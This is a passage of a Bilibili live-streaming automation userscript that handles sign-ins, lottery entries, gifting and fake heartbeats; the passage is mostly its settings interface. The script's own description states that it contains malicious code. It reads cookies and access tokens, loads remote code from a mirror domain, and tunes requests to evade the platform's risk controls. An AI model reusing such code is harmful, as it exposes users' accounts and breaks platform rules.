// ==UserScript==
// @name         Bilibili直播间挂机助手-魔改
// @namespace    SeaLoong
// @version      2.4.5.11
// @description  Bilibili直播间自动签到，领瓜子，参加抽奖，完成任务，送礼，自动点亮勋章，挂小心心等，包含恶意代码
// @author       SeaLoong,lzghzr,pjy612
// @updateURL    https://github.com.cnpmjs.org/pjy612/Bilibili-LRHH/raw/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @downloadURL  https://github.com.cnpmjs.org/pjy612/Bilibili-LRHH/raw/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @homepageURL  https://github.com/pjy612/Bilibili-LRHH
// @supportURL   https://github.com/pjy612/Bilibili-LRHH/issues
// @include      /https?:\/\/live\.bilibili\.com\/[blanc\/]?[^?]*?\d+\??.*/
// @include      /https?:\/\/api\.live\.bilibili\.com\/_.*/
// @require      https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js
// @require      https://github.com.cnpmjs.org/pjy612/Bilibili-LRHH/raw/master/BilibiliAPI_Plus.js
// @require      https://cdn.jsdelivr.net/gh/SeaLoong/Bilibili-LRHH/OCRAD.min.js
// @require      https://cdn.jsdelivr.net/gh/lzghzr/TampermonkeyJS/libBilibiliToken/libBilibiliToken.user.js
// @run-at       document-idle
// @license      MIT License
// @connect      passport.bilibili.com
// @connect      api.live.bilibili.com
// @grant        GM_xmlhttpRequest
// ==/UserScript==
/*
瓜子初始化失败问题自行替换上方对应OCRAD源
[github源]
// @require      https://raw.githubusercontent.com/SeaLoong/Bilibili-LRHH/master/OCRAD.min.js
[gitee源]
// @require      https://gitee.com/SeaLoong/Bilibili-LRHH/raw/master/OCRAD.min.js
[腾讯云源]
// @require      https://js-1258131272.file.myqcloud.com/OCRAD.min.js
[jsDelivr源]
// @require      https://cdn.jsdelivr.net/gh/SeaLoong/Bilibili-LRHH/OCRAD.min.js
*/
(function BLRHH_Plus() {
    'use strict';
    const NAME = 'BLRHH-Plus';
    const VERSION = '2.4.5.11';
    try{
        var tmpcache = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
        const t = Date.now() / 1000;
        if (t - tmpcache.unique_check >= 0 && t - tmpcache.unique_check <= 60) {
            console.error('魔改脚本重复运行')
            return;
        }
    }catch(e){
    }
    let scriptRuning = false;
    let API;
    let TokenUtil;
    let Token;
    const window = typeof unsafeWindow === 'undefined' ? window : unsafeWindow;
    const isSubScript = () => window.frameElement && window.parent[NAME] && window.frameElement[NAME];

    const DEBUGMODE = false || window.top.localStorage.getItem('BLRHH-DEBUG');
    const DEBUG = (sign, ...data) => {
        if (!DEBUGMODE) return;
        let d = new Date();
        d = `[${NAME}]${(isSubScript() ? 'SubScript:' : '')}[${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}:${d.getMilliseconds()}]`;
        if (data.length === 1) console.debug(d, `${sign}:`, data[0]);
        else console.debug(d, `${sign}:`, data);
    };

    let CONFIG;
    let CACHE;
    let Info = {
        short_id: undefined,
        roomid: undefined,
        uid: undefined,
        ruid: undefined,
        rnd: undefined,
        csrf_token: undefined,
        visit_id: undefined,
        silver: undefined,
        gold: undefined,
        mobile_verify: undefined,
        identification: undefined,
        gift_list: undefined,
        gift_list_str: '礼物对照表',
        blocked: false,
        awardBlocked:false,
        appToken: undefined
    };
    const getAccessToken = async () => {
        if(Token && TokenUtil){
            const userToken = await Token.getToken();
            if (userToken === undefined){
                console.error('未获取到移动端token,部分功能可能失效');
            }
            return userToken;
        }
        return null;
    };

    const tz_offset = new Date().getTimezoneOffset() + 480;

    const ts_s = () => Math.round(ts_ms() / 1000);

    const ts_ms = () => Date.now();

    const getCookie = (name) => {
        let arr;
        const reg = new RegExp(`(^| )${name}=([^;]*)(;|$)`);
        if ((arr = document.cookie.match(reg))) {
            return unescape(arr[2]);
        } else {
            return null;
        }
    };

    const delayCall = (callback, delay = 10e3) => {
        const p = $.Deferred();
        setTimeout(() => {
            const t = callback();
            if (t && t.then) t.then((arg1, arg2, arg3, arg4, arg5, arg6) => p.resolve(arg1, arg2, arg3, arg4, arg5, arg6));
            else p.resolve();
        }, delay);
        return p;
    };

    const checkNewDay = (ts) => {
        // 检查是否为新的一天，以UTC+8为准
        const t = new Date(ts);
        t.setMinutes(t.getMinutes() + tz_offset);
        t.setHours(0, 0, 0, 0);
        const d = new Date();
        d.setMinutes(t.getMinutes() + tz_offset);
        return (d - t > 86400e3);
    };

    const runTomorrow = (callback) => {
        const t = new Date();
        t.setMinutes(t.getMinutes() + tz_offset);
        t.setDate(t.getDate() + 1);
        t.setHours(0, 1, 0, 0);
        t.setMinutes(t.getMinutes() - tz_offset);
        setTimeout(callback, t - ts_ms());
        DEBUG('runTomorrow', t.toString());
    };
    if (!isSubScript()) {
        const runUntilSucceed = (callback, delay = 0, period = 100) => {
            setTimeout(() => {
                if (!callback()) runUntilSucceed(callback, period, period);
            }, delay);
        };

        const addCSS = (context) => {
            const style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = context;
            document.getElementsByTagName('head')[0].appendChild(style);
        };

        const Essential = {
            init: () => {
                return Essential.Toast.init().then(() => {
                    return Essential.AlertDialog.init().then(() => {
                        return Essential.Config.init().then(() => {
                            Essential.DataSync.init();
                            Essential.Cache.load();
                            Essential.Config.load();
                        });
                    });
                });
            },
            Toast: {
                init: () => {
                    try {
                        const toastList = [];
                        window.toast = (msg, type = 'info', timeout = 3e3) => {
                            let d = new Date().toLocaleTimeString();
                            switch (type) {
                                case 'success':
                                case 'info':
                                    console.info(`[${NAME}][${d}]${msg}`);
                                    break;
                                case 'caution':
                                    console.warn(`[${NAME}][${d}]${msg}`);
                                    break;
                                case 'error':
                                    console.error(`[${NAME}][${d}]${msg}`);
                                    break;
                                default:
                                    type = 'info';
                                    console.log(`[${NAME}][${d}]${msg}`);
                            }
                            if (CONFIG && !CONFIG.SHOW_TOAST) return;
                            const a = $(`<div class="link-toast ${type} fixed"><span class="toast-text">${msg}</span></div>`)[0];
                            document.body.appendChild(a);
                            a.style.top = (document.body.scrollTop + toastList.length * 40 + 10) + 'px';
                            a.style.left = (document.body.offsetWidth + document.body.scrollLeft - a.offsetWidth - 5) + 'px';
                            toastList.push(a);
                            setTimeout(() => {
                                a.className += ' out';
                                setTimeout(() => {
                                    toastList.shift();
                                    toastList.forEach((v) => {
                                        v.style.top = (parseInt(v.style.top, 10) - 40) + 'px';
                                    });
                                    $(a).remove();
                                }, 200);
                            }, timeout);
                        };
                        return $.Deferred().resolve();
                    } catch (err) {
                        console.error(`[${NAME}]初始化浮动提示时出现异常`);
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            }, // Need Init
            AlertDialog: {
                init: () => {
                    try {
                        const div_background = $(`<div id="${NAME}_alertdialog"/>`);
                        div_background[0].style = 'display: table;position: fixed;height: 100%;width: 100%;top: 0;left: 0;font-size: 12px;z-index: 10000;background-color: rgba(0,0,0,.5);';
                        const div_position = $('<div/>');
                        div_position[0].style = 'display: table-cell;vertical-align: middle;';
                        const div_style = $('<div/>');
                        div_style[0].style = 'position: relative;top: 50%;width: 40%;padding: 16px;border-radius: 5px;background-color: #fff;margin: 0 auto;';
                        div_position.append(div_style);
                        div_background.append(div_position);

                        const div_title = $('<div/>');
                        div_title[0].style = 'position: relative;padding-bottom: 12px;';
                        const div_title_span = $('<span>提示</span>');
                        div_title_span[0].style = 'margin: 0;color: #23ade5;font-size: 16px;';
                        div_title.append(div_title_span);
                        div_style.append(div_title);

                        const div_content = $('<div/>');
                        div_content[0].style = 'display: inline-block;vertical-align: top;font-size: 14px;overflow: auto;height: 300px;';
                        div_style.append(div_content);

                        const div_button = $('<div/>');
                        div_button[0].style = 'position: relative;height: 32px;margin-top: 12px;';
                        div_style.append(div_button);

                        const button_ok = $('<button><span>确定</span></button>');
                        button_ok[0].style = 'position: absolute;height: 100%;min-width: 68px;right: 0;background-color: #23ade5;color: #fff;border-radius: 4px;font-size: 14px;border: 0;cursor: pointer;';
                        div_button.append(button_ok);

                        window.alertdialog = (title, content) => {
                            div_title_span.html(title);
                            div_content.html(content);
                            button_ok.click(() => {
                                $(`#${NAME}_alertdialog`).remove();
                            });
                            $('body > .link-popup-ctnr').first().append(div_background);
                        };
                        return $.Deferred().resolve();
                    } catch (err) {
                        window.toast('初始化帮助界面时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            }, // Need Init After Toast.init
            Config: {
                CONFIG_DEFAULT: {
                    DD_BP:true,
                    DD_DM_STORM:true,
                    AUTO_SIGN: true,
                    AUTO_TREASUREBOX: true,
                    AUTO_GROUP_SIGN: true,
                    MOBILE_HEARTBEAT: true,
                    AUTO_LOTTERY: true,
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:"",
                        GIFT_LOTTERY: true,
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: 0
                        },
                        GUARD_AWARD: true,
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: 1,
                            CHANGE_ROOM_INTERVAL: 60
                        },
                        PK_AWARD:true,
                        MATERIAL_OBJECT_LOTTERY: true,
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: 10,
                            IGNORE_QUESTIONABLE_LOTTERY: true
                        },
                        STORM:false,
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:3,
                            STORM_MAX_COUNT:100,
                            STORM_ONE_LIMIT:180,
                        },
                        HIDE_POPUP: true
                    },
                    AUTO_TASK: true,
                    AUTO_GIFT: false,
                    AUTO_GIFT_CONFIG: {
                        ROOMID: [0],
                        EXCLUDE_ROOMID:[0],
                        GIFT_INTERVAL:10,
                        GIFT_LIMIT:86400,
                        GIFT_SORT:true,
                        AUTO_LIGHT:true,
                        SEND_ALL: false
                    },
                    SILVER2COIN: false,
                    AUTO_DAILYREWARD: true,
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: true,
                        WATCH: true,
                        COIN: false,
                        COIN_CONFIG: {
                            NUMBER: 5
                        },
                        SHARE: true
                    },
                    SHOW_TOAST: true
                },
                NAME: {
                    DD_BP:'BiliPush推送',
                    DD_DM_STORM:'DD弹幕风暴',
                    AUTO_SIGN: '自动签到',
                    AUTO_TREASUREBOX: '自动领取银瓜子',
                    AUTO_GROUP_SIGN: '自动应援团签到',
                    MOBILE_HEARTBEAT: '移动端心跳',
                    AUTO_LOTTERY: '自动抽奖',
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:'休眠时间',
                        GIFT_LOTTERY: '礼物抽奖',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '刷新间隔'
                        },
                        GUARD_AWARD: '舰队领奖',
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '监听倍数',
                            CHANGE_ROOM_INTERVAL: '换房间隔'
                        },
                        PK_AWARD:'乱斗领奖',
                        MATERIAL_OBJECT_LOTTERY: '实物抽奖',
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '检查间隔',
                            IGNORE_QUESTIONABLE_LOTTERY: '忽略存疑的抽奖'
                        },
                        STORM:'节奏风暴',
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:'同时参与数',
                            STORM_MAX_COUNT:'最大次数',
                            STORM_ONE_LIMIT:'尝试间隔',
                        },
                        HIDE_POPUP: '隐藏抽奖提示框'
                    },
                    AUTO_TASK: '自动完成任务',
                    AUTO_GIFT: '自动送礼物',
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '优先房间号',
                        EXCLUDE_ROOMID:'排除房间号',
                        GIFT_INTERVAL:'检查间隔(分钟)',
                        GIFT_SORT:'优先高等级',
                        GIFT_LIMIT:'到期时间(秒)',
                        AUTO_LIGHT:'自动点亮勋章',
                        SEND_ALL: '送满全部勋章'
                    },
                    SILVER2COIN: '银瓜子换硬币',
                    AUTO_DAILYREWARD: '自动每日奖励',
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: '登录',
                        WATCH: '观看',
                        COIN: '投币',
                        COIN_CONFIG: {
                            NUMBER: '数量'
                        },
                        SHARE: '分享'
                    },
                    SHOW_TOAST: '显示浮动提示'
                },
                PLACEHOLDER: {
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:'时间范围03:00-08:00',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '单位(分钟)'
                        },
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '1~5，默认1',
                            CHANGE_ROOM_INTERVAL: '单位(分钟)'
                        },
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '单位(分钟)'
                        },
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:'',
                            STORM_MAX_COUNT:'',
                            STORM_ONE_LIMIT:'单位（毫秒）',
                        },
                    },
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '为0不送礼',
                        GIFT_DEFAULT: '为空默认不送',
                        GIFT_ALLOWED: '为空允许所有'
                    }
                },
                HELP: {
                    DD_BP:'魔改助手核心监控，启用后由服务器推送全区礼物/舰队/PK（但需要验证使用者身份并带有DD传送门等附加功能）',
                    DD_DM_STORM:'DD弹幕风暴（娱乐功能），配合DD传送门进行人力节奏风暴，用于活跃直播间气氛。',
                    MOBILE_HEARTBEAT: '发送移动端心跳数据包，可以完成双端观看任务',
                    AUTO_LOTTERY: '设置是否自动参加抽奖功能，包括礼物抽奖、活动抽奖、实物抽奖<br>会占用更多资源并可能导致卡顿，且有封号风险',
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:'休眠时间范围，英文逗号分隔<br>例如：<br>3:00-8:00,16:50-17:30<br>表示 3:00-8:00和16:50-17:30不进行礼物检测。<br>小时为当天只能为0-23,如果要转钟请单独配置aa:aa-23:59,00:00-bb:bb',
                        GIFT_LOTTERY: '包括小电视、摩天大楼、C位光环及其他可以通过送礼触发广播的抽奖<br>内置几秒钟的延迟',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '设置页面自动刷新的时间间隔，设置为0则不启用，单位为分钟<br>太久导致页面崩溃将无法正常运行脚本'
                        },
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '设置在各大分区中的每一个分区监听的直播间的数量，1~5之间的一个整数<br>可能导致占用大量内存或导致卡顿',
                            CHANGE_ROOM_INTERVAL: '设置在多久之后改变监听的房间，单位为分钟，0表示不改变'
                        },
                        MATERIAL_OBJECT_LOTTERY: '部分房间设有实物奖励抽奖，脚本使用穷举的方式检查是否有实物抽奖<br>请注意中奖后记得及时填写相关信息领取实物奖励',
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '每次穷举实物抽奖活动ID的时间间隔，单位为分钟',
                            IGNORE_QUESTIONABLE_LOTTERY: '对部分实物抽奖的标题存在疑问，勾选后不参加这部分抽奖'
                        },
                        STORM:'尝试参与节奏风暴<br>如果出现验证码提示的话请尝试实名制后再试',
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:'允许同时参与的风暴次数<br>超过容量时自动丢弃最早参与的风暴，避免同时请求过多造成风控',
                            STORM_MAX_COUNT:'单个风暴最大尝试次数',
                            STORM_ONE_LIMIT:'单个风暴参与次数间隔（毫秒）',
                        },
                        HIDE_POPUP: '隐藏位于聊天框下方的抽奖提示框<br>注意：脚本参加抽奖后，部分抽奖仍然可以手动点击参加，为避免小黑屋，不建议点击'
                    },
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '数组,优先送礼物的直播间ID(即地址中live.bilibili.com/后面的数字), 设置为0则无优先房间，小于0也视为0（因为你没有0的勋章）<br>例如：17171,21438956<br>不管[优先高等级]如何设置，会根据[送满全部勋章]（补满或者只消耗当日到期）条件去优先送17171的，再送21438956<br>之后根据[优先高等级]决定送高级还是低级',
                        EXCLUDE_ROOMID: '数组,排除送礼的直播间ID(即地址中live.bilibili.com/后面的数字)，填写的直播间不会自动送礼',
                        GIFT_INTERVAL:'检查间隔(分钟)',
                        GIFT_SORT:'打钩优先赠送高等级勋章，不打勾优先赠送低等级勋章',
                        GIFT_LIMIT:'到期时间范围（秒），86400为1天，时间小于1天的会被送掉',
                        GIFT_DEFAULT: () => (`设置默认送的礼物类型编号，多个请用英文逗号(,)隔开，为空则表示默认不送出礼物<br>${Info.gift_list_str}`),
                        GIFT_ALLOWED: () => (`设置允许送的礼物类型编号(任何未在此列表的礼物一定不会被送出!)，多个请用英文逗号(,)隔开，为空则表示允许送出所有类型的礼物<br><br>${Info.gift_list_str}`),
                        SEND_ALL: '打钩 送满全部勋章，否则 送出包裹中今天到期的礼物(会送出"默认礼物类型"之外的礼物，若今日亲密度已满则不送)',
                        AUTO_LIGHT:'自动用小心心点亮亲密度未满且未被排除的灰掉的勋章'
                    },
                    SILVER2COIN: '用银瓜子兑换硬币，每天只能兑换一次<br>700银瓜子兑换1个硬币',
                    AUTO_DAILYREWARD: '自动完成每日经验的任务',
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: '自动完成登录任务(凌晨的时候不一定能完成)',
                        WATCH: '自动完成观看任务(凌晨的时候不一定能完成)',
                        COIN: '对你关注的动态中最新几期的视频投币，直到投完设定的数量',
                        SHARE: '自动分享你关注的动态中最新一期的视频(可以完成任务，但实际上不会出现这条动态)'
                    },
                    SHOW_TOAST: '选择是否显示浮动提示，但提示信息依旧会在控制台显示'
                },
                showed: false,
                init: () => {
                    try {
                        const p = $.Deferred();
                        const getConst = (itemname, obj) => {
                            if (itemname.indexOf('-') > -1) {
                                const objname = itemname.match(/(.+?)-/)[1];
                                if (objname && obj[objname]) return getConst(itemname.replace(`${objname}-`, ''), obj[objname]);
                                else return undefined;
                            }
                            if (typeof obj[itemname] === 'function') return obj[itemname]();
                            return obj[itemname];
                        };
                        const recur = (cfg, element, parentname = undefined) => {
                            for (const item in cfg) {
                                let itemname;
                                if (parentname) itemname = `${parentname}-${item}`;
                                else itemname = item;
                                const id = `${NAME}_config_${itemname}`;
                                const name = getConst(itemname, Essential.Config.NAME);
                                const placeholder = getConst(itemname, Essential.Config.PLACEHOLDER);
                                let e;
                                let h;
                                if (getConst(itemname, Essential.Config.HELP)) h = $(`<div class="${NAME}_help" id="${id}_help" style="display: inline;"><span class="${NAME}_clickable">?</span></div>`);
                                switch ($.type(cfg[item])) {
                                    case 'number':
                                    case 'string':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(`<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`);
                                        if (h) e.append(h);
                                        element.append(e);
                                        break;
                                    case 'boolean':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(`<label style="display: inline;" title="${name}"><input id="${id}" type="checkbox" class="${NAME}_input_checkbox">${name}</label>`);
                                        if (h) e.append(h);
                                        element.append(e);
                                        if (getConst(`${itemname}_CONFIG`, Essential.Config.NAME)) $(`#${id}`).addClass(`${NAME}_control`);
                                        break;
                                    case 'array':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(`<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`);
                                        if (h) e.append(h);
                                        element.append(e);
                                        break;
                                    case 'object':
                                        e = $(`<div id="${id}" style="margin: 0px 0px 8px 12px;"/>`);
                                        element.append(e);
                                        recur(cfg[item], e, itemname);
                                        break;
                                }
                            }
                        };
                        runUntilSucceed(() => {
                            try {
                                let findSp = false;
                                let blancFrames = $('iframe');
                                if(blancFrames && blancFrames.length>0){
                                    blancFrames.each((k,v)=>{
                                        if(v.src.includes('/blanc/')){
                                            findSp = true;
                                            window.toast('检查到特殊活动页，尝试跳转...', 'info',5e3);
                                            setTimeout(()=>{
                                                location.replace(v.src);
                                            },10);
                                            return false;
                                        }
                                    });
                                }
                                if(findSp) {
                                    p.reject();
                                    return true;
                                }
                                //if (!$('#sidebar-vm div.side-bar-cntr')[0]) return false;
                                if (!$('#sidebar-vm')[0]) return false;
                                // 加载css
                                addCSS(`.${NAME}_clickable {font-size: 12px;color: #0080c6;cursor: pointer;text-decoration: underline;}
.${NAME}_setting_item {margin: 6px 0px;}
.${NAME}_input_checkbox {vertical-align: bottom;}
.${NAME}_input_text {margin: -2px 0 -2px 4px;padding: 0;}`);
                                // 绘制右下角按钮
                                const div_button_span = $('<span>魔改助手设置</span>');
                                div_button_span[0].style = 'font-size: 12px;line-height: 16px;color: #0080c6;';
                                const div_button = $('<div/>');
                                div_button[0].style = 'cursor: pointer;text-align: center;padding: 0px;';
                                const div_side_bar = $('<div/>');
                                div_side_bar[0].style = 'width: 56px;height: 32px;overflow: hidden;position: fixed;right: 0px;bottom: 10%;padding: 4px 4px;background-color: rgb(255, 255, 255);z-index: 10001;border-radius: 8px 0px 0px 8px;box-shadow: rgba(0, 85, 255, 0.0980392) 0px 0px 20px 0px;border: 1px solid rgb(233, 234, 236);';
                                div_button.append(div_button_span);
                                div_side_bar.append(div_button);
                                //$('#sidebar-vm div.side-bar-cntr').first().after(div_side_bar);
                                $('#sidebar-vm').after(div_side_bar);
                                // 绘制设置界面
                                const div_position = $('<div/>');
                                div_position[0].style = 'display: none;position: fixed;height: 300px;width: 350px;bottom: 5%;z-index: 9999;';
                                const div_style = $('<div/>');
                                div_style[0].style = 'display: block;overflow: hidden;height: 300px;width: 350px;border-radius: 8px;box-shadow: rgba(106, 115, 133, 0.219608) 0px 6px 12px 0px;border: 1px solid rgb(233, 234, 236);background-color: rgb(255, 255, 255);';
                                div_position.append(div_style);
                                document.body.appendChild(div_position[0]);
                                // 绘制标题栏及按钮
                                const div_title = $('<div/>');
                                div_title[0].style = 'display: block;border-bottom: 1px solid #E6E6E6;height: 35px;line-height: 35px;margin: 0;padding: 0;overflow: hidden;';
                                const div_title_span = $('<span style="float: left;display: inline;padding-left: 8px;font: 700 14px/35px SimSun;">Bilibili直播间挂机助手-魔改</span>');
                                const div_title_button = $('<div/>');
                                div_title_button[0].style = 'float: right;display: inline;padding-right: 8px;';
                                const div_button_line = $(`<div style="display: inline;"></div>`);
                                const span_button_state = $(`<span class="${NAME}_clickable">统计</span>`)
                                div_button_line.append(span_button_state);
                                div_button_line.append("&nbsp;&nbsp;");
                                const span_button_clear = $(`<span class="${NAME}_clickable">清除缓存</span>`)
                                div_button_line.append(span_button_clear);
                                div_title_button.append(div_button_line);
                                div_title.append(div_title_span);
                                div_title.append(div_title_button);
                                div_style.append(div_title);
                                // 绘制设置项内容
                                const div_context_position = $('<div/>');
                                div_context_position[0].style = 'display: block;position: absolute;top: 36px;width: 100%;height: calc(100% - 36px);';
                                const div_context = $('<div/>');
                                div_context[0].style = 'height: 100%;overflow: auto;padding: 0 12px;margin: 0px;';
                                div_context_position.append(div_context);
                                div_style.append(div_context_position);
                                recur(Essential.Config.CONFIG_DEFAULT, div_context);
                                // 设置事件
                                div_button.click(() => {
                                    if (!Essential.Config.showed) {
                                        Essential.Config.load();
                                        div_position.css('right', div_side_bar[0].clientWidth + 'px');
                                        div_position.show();
                                        div_button_span.text('点击保存设置');
                                        div_button_span.css('color', '#ff8e29');
                                    } else {
                                        Essential.Config.save();
                                        div_position.hide();
                                        div_button_span.text('魔改助手设置');
                                        div_button_span.css('color', '#0080c6');
                                        BiliPushUtils.Check.sleepTimeRangeBuild();
                                        if(CONFIG.DD_BP){
                                            BiliPush.connectWebsocket(true);
                                        }else if(BiliPush.gsocket) {
                                            BiliPush.gsocket.close();
                                        }
                                    }
                                    Essential.Config.showed = !Essential.Config.showed;
                                });
                                span_button_clear.click(() => {
                                    Essential.Cache.clear();
                                    location.reload();
                                });
                                span_button_state.click(()=>{
                                    Statistics.showDayGifts();
                                });
                                const getItemByElement = (element) => element.id.replace(`${NAME}_config_`, '');
                                const getItemByHelpElement = (element) => element.id.replace(`${NAME}_config_`, '').replace('_help', '');
                                $(`.${NAME}_help`).click(function () {
                                    window.alertdialog('说明', getConst(getItemByHelpElement(this), Essential.Config.HELP));
                                });
                                $(`.${NAME}_control`).click(function () {
                                    if ($(this).is(':checked')) {
                                        $(`#${NAME}_config_${getItemByElement(this)}_CONFIG`).show();
                                    } else {
                                        $(`#${NAME}_config_${getItemByElement(this)}_CONFIG`).hide();
                                    }
                                });
                                p.resolve();
                                return true;
                            } catch (err) {
                                window.toast('初始化设置界面时出现异常', 'error');
                                console.error(`[${NAME}]`, err);
                                p.reject();
                                return true;
                            }
                        });
                        return p;
                    } catch (err) {
                        window.toast('初始化设置时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                },
                recurLoad: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
                    for (const item in cfg_default) {
                        let itemname;
                        if (parentname) itemname = `${parentname}-${item}`;
                        else itemname = item;
                        const e = $(`#${NAME}_config_${itemname}`);
                        if (!e[0]) continue;
                        if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
                        switch ($.type(cfg[item])) {
                            case 'number':
                            case 'string':
                                e.val(cfg[item]);
                                break;
                            case 'boolean':
                                e.prop('checked', cfg[item]);
                                if (e.is(':checked')) $(`#${NAME}_config_${itemname}_CONFIG`).show();
                                else $(`#${NAME}_config_${itemname}_CONFIG`).hide();
                                break;
                            case 'array':
                                e.val(cfg[item].join(','));
                                break;
                            case 'object':
                                Essential.Config.recurLoad(cfg[item], itemname, cfg_default[item]);
                                break;
                        }
                    }
                },
                recurSave: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
                    if (Object.prototype.toString.call(cfg) !== '[object Object]') return cfg;
                    for (const item in cfg_default) {
                        let itemname;
                        if (parentname) itemname = `${parentname}-${item}`;
                        else itemname = item;
                        const e = $(`#${NAME}_config_${itemname}`);
                        if (!e[0]) continue;
                        switch ($.type(cfg[item])) {
                            case 'string':
                                cfg[item] = e.val() || '';
                                break;
                            case 'number':
                                cfg[item] = parseFloat(e.val());
                                if (isNaN(cfg[item])) cfg[item] = 0;
                                break;
                            case 'boolean':
                                cfg[item] = e.is(':checked');
                                break;
                            case 'array':
                                var value = e.val().replace(/(\s|\u00A0)+/, '');
                                if (value === '') {
                                    cfg[item] = [];
                                }
                                else{
                                    cfg[item] = value.split(',');
                                    cfg[item].forEach((v, i) => {
                                        cfg[item][i] = parseFloat(v);
                                        if (isNaN(cfg[item][i])) cfg[item][i] = 0;
                                    });
                                }
                                break;
                            case 'object':
                                cfg[item] = Essential.Config.recurSave(cfg[item], itemname, cfg_default[item]);
                                break;
                        }
                        if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
                    }
                    return cfg;
                },
                fix: (config) => {
                    // 修正设置项中不合法的参数，针对有输入框的设置项
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER === undefined) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER;
                    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = parseInt(config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER < 1) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 1;
                    else if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER > 5) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 5;

                    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL === undefined) config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = 0;

                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL === undefined) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = 0;

